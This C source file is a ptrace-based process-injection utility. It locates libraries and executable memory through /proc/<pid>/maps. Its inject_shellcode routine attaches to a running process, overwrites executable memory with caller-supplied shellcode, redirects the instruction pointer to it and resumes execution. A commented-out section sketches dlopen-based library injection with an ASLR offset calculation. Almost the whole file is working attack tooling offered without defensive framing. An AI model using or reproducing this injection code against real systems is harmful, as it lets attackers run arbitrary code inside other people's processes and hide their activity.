#include <stdio.h>
#include <sys/ptrace.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

#include "inject.h"
#include "ptrace_utils.h"

#define IF_FAILURE_THEN_DONE(res) do { if(0 != res) goto done; } while(0)
#define ONEKB 1024


/**
 * @brief Searches memory maps for a library in a targeted 
 * processes memory or search for a library within ourself 
 * 
 * @param library - string of library to search for
 * @param pid - pid of target process, if -1, then 
 * 				search within self
 * @return unsigned long long of starting address of library on 
 * 		   success or 0 on failure
 */
unsigned long findLibrary(const char *library, pid_t pid) {
    char mapFilename[ONEKB];
    char buffer[9076];
    FILE *fd;
    unsigned long long addr = 0;

	if (pid == -1) {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");
	} 
    else {
		snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);
	}

	fd = fopen(mapFilename, "r");

	while(fgets(buffer, sizeof(buffer), fd)) {
		if (strstr(buffer, library)) {
			addr = strtoull(buffer, NULL, 16);
			break;
		}
	}
	fclose(fd);

	return addr;
}

unsigned long findExecAddr(pid_t pid) {
	FILE *fp = NULL;
	char filename[30] = {};
	char line[850] = {};
	char str[20] = {};
	char perms[5] = {};
	long addr = 0;

	sprintf(filename, "/proc/%d/maps", pid);
	fp = fopen(filename, "r");
	if(NULL == fp) {
		printf("Failed to open /proc/%d/maps", pid);
		return addr;
	}

	/* 
	 * Search until an entry with executable
	 * memory is found
	 */ 
	while(NULL != fgets(line, 850, fp)) {
		sscanf(line, "%lx-%*x %s %*s %s %*d", &addr, perms, str);
		if(strstr(perms, "x") != NULL) {
			break;
		}
	}
	if(addr){
		printf("[+] Found executable memory at %lx\n", addr);
	}
	else{
		printf("[?] No executable memory found?? Something broke...");
	}
	
	fclose(fp);

	return addr;
}


int inject_shellcode(pid_t pid, void* shellcode, size_t shellcode_len, uint8_t options){

	unsigned char *oldcode = NULL;
	struct user_regs_struct oldregs;
	struct user_regs_struct regs;
	long addr = 0;
	int status = 0;
	int result = EXIT_SUCCESS;

	// Clear any possible junk
	memset(&oldregs, 0, sizeof(struct user_regs_struct));
	memset(&regs, 0, sizeof(struct user_regs_struct));

	// Attach to the target process
	result = ptraceAttach(pid, &status);
	IF_FAILURE_THEN_DONE(result);

	// Store the current register values for later
	result = ptraceGetRegs(pid, &oldregs);
	IF_FAILURE_THEN_DONE(result);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

	// Find a good address to copy code to
	addr = findExecAddr(pid);
	if(!addr){
		result = EXIT_FAILURE;
		goto done;
	}

	// Allocate memory for code we carve out
	oldcode = malloc(shellcode_len * sizeof(uint8_t));

	// Read out a copy of the code occupying executable memory
	result = ptraceRead(pid, addr, oldcode, shellcode_len);
	IF_FAILURE_THEN_DONE(result);
	
	// Inject
	printf("[+] Injecting %lu bytes of shellcode...\n", shellcode_len);
	result = ptraceWrite(pid, addr, shellcode, shellcode_len);
	IF_FAILURE_THEN_DONE(result);
	
	regs.rip = addr + 2;
	ptraceSetRegs(pid, &regs);
	IF_FAILURE_THEN_DONE(result);

	result = ptraceCont(pid, 0, (int*)0);
	IF_FAILURE_THEN_DONE(result);

	result = ptraceDetach(pid);	

done:
	if(NULL != oldcode){
		free(oldcode);
	}
	return result;
}



/*
    unsigned long long target_libdl_exemem, self_libdl_exemem;
    void *dlopen_sym_addr = NULL;
    void *self_libdl_addr = NULL;

	self_libdl_addr = dlopen("libdl.so", RTLD_LAZY);
	if (self_libdl_addr == NULL) {
		printf("[!] Error opening libdl.so\n");
		exit(EXIT_FAILURE);
	}
	printf("[*] libdl.so loaded at address %p\n", self_libdl_addr);

	dlopen_sym_addr = dlsym(self_libdl_addr, "dlopen");
	if (dlopen_sym_addr == NULL) {
		printf("[!] Error locating dlopen() function\n");
		exit(EXIT_FAILURE);
	}
	printf("[*] dlopen() found at address %p\n", dlopen_sym_addr);

	// Find the base address of libdl in our target process
	target_libdl_exemem = findLibrary("libdl", atoi(argv[1]));
	if(!target_libdl_exemem){
		printf("[-] Could not locate libdl in PID: %i", atoi(argv[1]));
		exit(EXIT_FAILURE);
	}
	printf("[*] libdl located in PID %d at address %p\n", atoi(argv[1]), (void*)target_libdl_exemem);

	// Find base of executable lib memory
	self_libdl_exemem = findLibrary("libdl", -1);

	 * Due to ASLR, we need to calculate the 
	 * address offset in the target process
	 
	dlopen_sym_addr = target_libdl_exemem + (dlopen_sym_addr - self_libdl_exemem);
	printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(self_libdl_addr - self_libdl_exemem));
	printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopen_sym_addr);

*/